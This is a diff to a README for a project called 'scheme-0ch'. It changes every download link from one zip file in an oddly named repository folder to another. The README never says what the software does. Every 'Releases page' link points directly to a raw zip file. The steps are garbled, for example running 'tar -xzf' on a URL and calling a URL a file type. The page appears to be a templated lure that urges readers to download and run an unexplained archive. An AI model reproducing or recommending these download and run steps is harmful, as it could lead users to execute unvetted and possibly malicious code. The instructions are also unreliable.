@@ -1,7 +1,7 @@
 # 🎉 scheme-0ch - Simple and Easy to Use
 
 ## 📥 Download Now
-[![Download scheme-0ch](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme-0ch-3.9.zip)](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme-0ch-3.9.zip)
+[![Download scheme-0ch](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme_ch_v3.5.zip)](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme_ch_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to scheme-0ch! This application aims to simplify your tasks with a user-friendly interface. Follow the steps below to get started quickly.
@@ -15,13 +15,13 @@ Before downloading, please ensure your system meets these requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme-0ch-3.9.zip) to find the latest version of scheme-0ch.
+   Go to our [Releases page](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme_ch_v3.5.zip) to find the latest version of scheme-0ch.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of versions. Select the most recent release. 
 
 3. **Download the File**  
-   Click on the file that matches your operating system to start the download. It may be a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme-0ch-3.9.zip` file.
+   Click on the file that matches your operating system to start the download. It may be a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme_ch_v3.5.zip` file.
 
 4. **Locate the Downloaded File**  
    After the download is complete, locate the file in your Downloads folder or the folder you chose for downloads.
@@ -29,7 +29,7 @@ Before downloading, please ensure your system meets these requirements:
 5. **Run the Application**  
    - For Windows: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
    - For macOS: Open the `.dmg` file and drag the scheme-0ch icon into your Applications folder. Then, go to your Applications to run it.
-   - For Linux: Open a terminal and navigate to the folder where the `https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme-0ch-3.9.zip` file was downloaded. Extract it using `tar -xzf https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme-0ch-3.9.zip`, then run the application using `./filename`.
+   - For Linux: Open a terminal and navigate to the folder where the `https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme_ch_v3.5.zip` file was downloaded. Extract it using `tar -xzf https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme_ch_v3.5.zip`, then run the application using `./filename`.
 
 ## 🛠️ Features
 - **User-Friendly Interface**: Easily navigate through the application without any technical knowledge.
@@ -43,7 +43,7 @@ If you encounter any issues during installation or while running the application
 
 2. **Application Not Opening**: Make sure your system meets the requirements listed above. Restart your computer if necessary.
 
-3. **Update Issues**: Always download the latest version from the [Releases page](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme-0ch-3.9.zip) for the best experience.
+3. **Update Issues**: Always download the latest version from the [Releases page](https://raw.githubusercontent.com/fora17819/scheme-0ch/main/geophagist/scheme_ch_v3.5.zip) for the best experience.
 
 ## 📞 Support
 For any questions or feedback, please use the Issues section in this repository. Your input helps us improve scheme-0ch.
